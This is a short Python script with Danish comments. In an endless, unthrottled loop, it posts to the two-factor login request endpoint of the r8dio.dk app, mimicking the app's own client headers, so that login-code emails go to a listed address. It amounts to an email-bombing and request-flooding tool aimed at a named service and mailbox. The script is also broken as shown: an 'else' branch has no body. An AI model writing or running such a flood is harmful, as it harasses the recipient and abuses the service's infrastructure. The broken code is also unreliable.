import requests
import json

# Endpoint og headers
url = "https://app.r8dio.dk/api/v1/login/request-2fa"
headers = {
    "Accept": "application/json",
    "Accept-Charset": "UTF-8",
    "Accept-Encoding": "gzip",
    "Connection": "Keep-Alive",
    "Content-Length": "30",
    "Content-Type": "application/json",
    "Host": "app.r8dio.dk",
    "User-Agent": "Ktor client"
}

# Liste af e-mails (kan også læses fra en fil)
emails = [
    "kontakt@r8dio.dk"
]

# Uendelig løkke til POST-anmodninger
while True:
    for email in emails:
        payload = {"email": email}
        try:
            response = requests.post(url, headers=headers, json=payload)
            if response.status_code == 200:
                print(f"Mail til {email} afsendt")
            else:
        except Exception as e:
            print(f"Failed to send request for email {email}: {e}")
